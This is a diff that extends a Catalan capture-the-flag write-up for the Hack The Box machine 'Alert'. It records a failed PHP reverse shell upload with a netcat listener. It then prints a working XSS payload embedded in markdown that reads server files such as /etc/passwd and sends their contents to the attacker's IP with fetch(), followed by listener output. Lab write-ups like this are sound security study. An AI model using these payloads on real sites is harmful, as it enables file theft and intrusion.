@@ -165,7 +165,64 @@ I sí, l'aplicació web funciona i ens permet veure el fitxer markdown que acabe
 
 Curíos que a baix a la dreta hi ha un botó que posa "Share markdown". Si hi cliquem ens obre la visualització del markdown en una altra pestanya.
 
+
 ![image](https://github.com/user-attachments/assets/df65cef0-4241-41d1-baef-757f6be29496)
 
 
 Pel que veiem, sembla que haurem de pujar un fitxer markdown amb alguna reverse shell en php.
+
+Ara, provarem de pujar una reverse shell amb de PHP amb el format .md a veure si funciona (no crec que sigui tant senzill). He agafat la reverse shell de https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php . Tal i com indica l'script, simplement hem canviat aquesta part:
+```
+$ip = '10.10.14.148';  // CHANGE THIS
+$port = 4444;       // CHANGE THIS
+```
+Mentre a la nostra màquina obrim el port per escoltar:
+```
+┌──(kali㉿kali)-[~/Documents/Alert]
+└─$ nc -nlvp 4444
+listening on [any] 4444 ...
+```
+
+Ara cliquem a View Markdown, i no veiem res, no es visualitza l'script php però tampoc funciona la reverse shell. Després de provar vàris reverse shell en vàris llenguatges de programació diferents, bash, php, python, ... provarem a fer XSS. He trobat un payload per fer-ho, que combina XSS (Cross-Site Scripting) i SSRF (Server-Side Request Forgery). El payload que posem al fitxer markwodn és el següent:
+
+```
+<script>
+fetch("http://alert.htb/messages.php?file=filepath")
+  .then(response => response.text())
+  .then(data => {
+    fetch("http://10.10.14.148:4444/?file_content=" + encodeURIComponent(data));
+  });
+</script>
+```
+
+Al pujar aquest payload en un fitxer markdown, funciona:
+
+```
+┌──(kali㉿kali)-[~/Documents/Alert]
+└─$ nc -nlvp 4444              
+listening on [any] 4444 ...
+connect to [10.10.14.148] from (UNKNOWN) [10.10.14.148] 43340
+GET /?file_content=%0A HTTP/1.1
+Host: 10.10.14.148:4444
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://alert.htb/
+Origin: http://alert.htb
+Connection: keep-alive
+Priority: u=4
+```
+
+Per tant, ara ja podem a¡començar a buscar i extreure dades. amb XSS anar provant a veure si aconseguim llegir algun fitxer interessant. A veure si podem llegir el que hi ha al home. Al no tenir una reverse shell, haurem d'utilitzar el payload per llegir l'/etc/passwd, per fer això hem deixat el payload així. Després de vàries proves per fer XSS i buscar el fitxer /etc/passwd, la versió que ha funcionat el payload ha estat la següent:
+```
+script>
+fetch("http://alert.htb/messages.php?file=/etc/passwd")
+  .then(response => response.text())
+  .then(data => {
+    fetch("http://10.10.14.148:4444/?file_content=" + encodeURIComponent(data));
+  });
+</script>
+```
+
+
